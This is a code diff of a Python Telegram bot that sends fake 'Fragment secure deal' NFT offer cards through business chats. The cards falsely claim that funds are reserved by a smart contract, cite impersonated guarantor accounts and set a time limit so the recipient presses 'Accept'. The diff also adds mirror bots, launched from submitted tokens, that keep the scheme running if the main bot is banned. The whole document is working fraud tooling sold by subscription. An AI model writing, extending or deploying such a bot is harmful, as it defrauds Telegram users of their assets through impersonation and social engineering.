@@ -13,7 +13,7 @@ from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 from aiogram.filters import Command
 from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
-                           InlineKeyboardMarkup, BusinessConnection, LinkPreviewOptions)
+                           InlineKeyboardMarkup, BusinessConnection)
 from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
 from dotenv import load_dotenv
 
@@ -31,6 +31,9 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
+# Список запущенных ботов-зеркал (в памяти)
+MIRROR_BOTS = []
+
 # ==========================================
 # БАЗА ДАННЫХ (БЕЗ СБРОСА ПОДПИСОК)
 # ==========================================
@@ -42,14 +45,12 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # ВАЖНО: таблицу users НЕ удаляем!
         conn.execute("""CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
             sub_type TEXT DEFAULT 'none', test_used INTEGER DEFAULT 0, 
             my_username TEXT, stats_created INTEGER DEFAULT 0, stats_accepted INTEGER DEFAULT 0
         )""")
         
-        # Офферы пересоздаем, чтобы схема была актуальной
         conn.execute("DROP TABLE IF EXISTS offers")
         conn.execute("""CREATE TABLE IF NOT EXISTS offers (
             id TEXT PRIMARY KEY, nft_name TEXT, nft_slug TEXT, 
@@ -58,7 +59,6 @@ def init_db():
             created_at INTEGER
         )""")
         
-        # Таблица для зеркал
         conn.execute("""CREATE TABLE IF NOT EXISTS mirrors (
             id INTEGER PRIMARY KEY AUTOINCREMENT, 
             token TEXT UNIQUE, 
@@ -77,7 +77,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# РЕГУЛЯРКИ И ПАРСЕРЫ (ИСПРАВЛЕНА ОШИБКА)
+# РЕГУЛЯРКИ И ПАРСЕРЫ
 # ==========================================
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
@@ -103,7 +103,7 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# ОТПРАВКА / УДАЛЕНИЕ
+# ОТПРАВКА / УДАЛЕНИЕ (КЛАССИЧЕСКИЙ ВИД)
 # ==========================================
 async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
@@ -111,7 +111,7 @@ async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_marku
             return await bot.send_message(
                 chat_id=chat_id, text=text, business_connection_id=conn_id,
                 reply_markup=reply_markup,
-                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True, prefer_large_media=True)
+                disable_web_page_preview=False # Картинка внизу (как было)
             )
         except TelegramBadRequest as e:
             if "PEER_FLOOD" in str(e): await asyncio.sleep(30)
@@ -136,7 +136,7 @@ async def on_business_conn(conn: BusinessConnection):
 # ==========================================
 # МЕНЮ
 # ==========================================
-async def show_main_menu(target, uid):
+async def show_main_menu(target, uid, bot_instance=None):
     with get_db() as conn:
         user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
     
@@ -162,8 +162,11 @@ async def show_main_menu(target, uid):
         [InlineKeyboardButton(text="💎 Подписка", callback_data="buy_sub")]
     ])
     
-    if isinstance(target, Message): await target.reply(text, reply_markup=kb)
-    else: await target.message.edit_text(text, reply_markup=kb)
+    # Отправка через переданный бот (главный или зеркало)
+    if isinstance(target, Message): 
+        await target.reply(text, reply_markup=kb)
+    else: 
+        await target.message.edit_text(text, reply_markup=kb)
 
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
@@ -173,7 +176,7 @@ async def cmd_start(msg: Message):
             "/keys — ключи\n"
             "/set_default @ник — сменить получателя\n"
             "/addkey — создать ключ\n"
-            "/setbot [токен] — добавить зеркало"
+            "/setbot [токен] — добавить и запустить зеркало"
         )
         return
     await show_main_menu(msg, msg.from_user.id)
@@ -184,7 +187,7 @@ async def cb_main_menu(cb: CallbackQuery):
     await cb.answer()
 
 # ==========================================
-# ЗЕРКАЛА (ОБЩЕЕ МЕНЮ)
+# ЗЕРКАЛА
 # ==========================================
 @router.callback_query(F.data == "mirrors_menu")
 async def cb_mirrors_menu(cb: CallbackQuery):
@@ -192,7 +195,7 @@ async def cb_mirrors_menu(cb: CallbackQuery):
         mirrors = conn.execute("SELECT * FROM mirrors").fetchall()
     
     if not mirrors:
-        text = "🪞 <b>Зеркала</b>\n\nСписок пока пуст. Если главный бот упадет, здесь появятся ссылки на копии."
+        text = "🪞 <b>Зеркала</b>\n\nСписок пока пуст."
     else:
         text = "🪞 <b>Зеркала бота</b>\n\nЕсли этот бот не отвечает, перейдите на одно из зеркал ниже. Ваша подписка сохранится:"
     
@@ -206,15 +209,6 @@ async def cb_mirrors_menu(cb: CallbackQuery):
     
     await cb.message.edit_text(text, reply_markup=kb)
     await cb.answer()
-
-@router.message(Command("addmirror")) # Команда для обычных юзеров
-async def cmd_addmirror_user(msg: Message):
-    await msg.reply(
-        "🪞 <b>Добавить зеркало</b>\n\n"
-        "Чтобы добавить своего бота в зеркала, отправьте команду:\n"
-        "<code>/setbot [ТОКЕН_БОТА]</code>\n\n"
-        "<i>Бот проверит токен и добавит его в меню. Ваш бот должен быть запущен (например, на Railway).</i>"
-    )
 
 # ==========================================
 # НАСТРОЙКИ
@@ -356,7 +350,7 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА
+# ОТПРАВКА ОФФЕРА (ТЕКСТ СВЕРХУ, КАРТИНКА ВНИЗУ)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
@@ -379,8 +373,8 @@ async def handle_business_message(msg: Message):
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
 
+    # ТЕКСТ СВЕРХУ, ССЫЛКА В КОНЦЕ (картинка внизу)
     card_text = (
-        f"{nft_link}\n\n"
         f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"<b>Уведомление о зарезервированной сделке</b>\n\n"
@@ -388,7 +382,8 @@ async def handle_business_message(msg: Message):
         f"✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.\n"
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
-        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>"
+        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
+        f"{nft_link}" # ССЫЛКА В КОНЦЕ ДЛЯ ПРЕВЬЮ ВНИЗУ
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -450,7 +445,7 @@ async def on_reject(cb: CallbackQuery):
     await cb.answer("Вы отклонили предложение.")
 
 # ==========================================
-# АДМИН (ДОБАВЛЕНИЕ ЗЕРКАЛ)
+# АДМИН (ДОБАВЛЕНИЕ И ЗАПУСК ЗЕРКАЛ)
 # ==========================================
 @router.message(Command("keys"))
 async def cmd_keys(msg: Message):
@@ -479,27 +474,62 @@ async def cmd_set_default(msg: Message):
 
 @router.message(F.text.regexp(r"^/setbot\s+"))
 async def cmd_setbot(msg: Message):
-    # Теперь любой может добавить зеркало
     parts = msg.text.split()
     if len(parts) < 2: return await msg.reply("❌ /setbot [ТОКЕН_БОТА]")
     
     token = parts[1]
     
     try:
-        # Проверяем токен
+        # 1. Проверяем токен
         temp_bot = Bot(token=token)
         me = await temp_bot.get_me()
         username = me.username
         
+        # 2. Сохраняем в БД
         with get_db() as conn:
             conn.execute("INSERT OR REPLACE INTO mirrors (token, username, added_by) VALUES (?, ?, ?)", (token, username, msg.from_user.id))
         
-        await msg.reply(f"✅ Зеркало <b>@{username}</b> успешно добавлено в общее меню!")
+        # 3. ЗАПУСКАЕМ ЗЕРКАЛО В ФОНЕ
+        await msg.reply(f"✅ Зеркало <b>@{username}</b> добавлено. Запускаю...")
+        
+        # Фоновая задача для запуска нового бота
+        async def run_mirror(bot_token):
+            mirror_dp = Dispatcher()
+            mirror_dp.include_router(router)
+            m_bot = Bot(token=bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+            try:
+                await mirror_dp.start_polling(m_bot)
+            except Exception as e:
+                log.error(f"Ошибка зеркала: {e}")
+
+        asyncio.create_task(run_mirror(token))
+        MIRROR_BOTS.append(token)
+        
+        await msg.reply(f"🚀 Зеркало <b>@{username}</b> запущено и готово к работе!")
+        
     except Exception as e:
         await msg.reply(f"❌ Ошибка: {e}")
 
 async def main():
-    log.info("Starting bot...")
+    log.info("Starting main bot...")
+    
+    # При запуске подгружаем все зеркала из базы и запускаем их
+    with get_db() as conn:
+        mirrors = conn.execute("SELECT token, username FROM mirrors").fetchall()
+    
+    for m in mirrors:
+        async def run_mirror(token, uname):
+            mirror_dp = Dispatcher()
+            mirror_dp.include_router(router)
+            m_bot = Bot(token=token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+            try:
+                log.info(f"🚀 Запуск зеркала @{uname}...")
+                await mirror_dp.start_polling(m_bot)
+            except Exception as e:
+                log.error(f"Ошибка зеркала @{uname}: {e}")
+
+        asyncio.create_task(run_mirror(m["token"], m["username"]))
+
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
